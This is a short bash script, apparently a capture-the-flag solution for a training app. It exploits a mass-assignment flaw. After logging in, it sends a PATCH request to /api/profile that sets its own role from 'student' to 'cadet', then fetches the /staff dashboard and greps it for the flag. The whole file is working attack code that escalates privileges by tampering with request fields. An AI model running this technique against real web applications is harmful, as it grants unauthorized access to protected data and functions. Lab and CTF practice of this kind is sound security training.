#!/usr/bin/env bash
# Flag 02 — Mass-assignment privilege escalation
set -uo pipefail
TARGET="${TARGET:-localhost}"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$DIR/lib.sh"
JAR="$DIR/.jdoe-02.jar"

darkly_login "$TARGET" "$JAR" || exit 1

echo "[*] Escalating role: student -> cadet" >&2
curl -s -i -b "$JAR" -X PATCH "http://${TARGET}:4942/api/profile" \
  -H 'Content-Type: application/json' -d '{"role":"cadet"}' | head -5 >&2

echo "[*] Fetching /staff dashboard" >&2
curl -s -b "$JAR" "http://${TARGET}:4942/staff" | grep -i flag
